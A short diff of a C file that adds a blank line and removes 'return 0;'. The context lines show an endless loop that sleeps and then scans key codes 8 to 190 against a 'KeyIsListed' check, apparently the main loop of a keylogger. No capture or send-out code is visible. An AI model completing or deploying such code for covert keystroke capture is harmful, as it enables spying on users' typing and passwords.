@@ -50,6 +50,7 @@ int main()
     char key;
     while(TRUE)
     {
+
         sleep(10);
         for (key = 8; key <= 190; key++){
             if(KeyIsListed(key) == FALSE){
@@ -61,5 +62,4 @@ int main()
             }
         }
     }
-    return 0;
 }
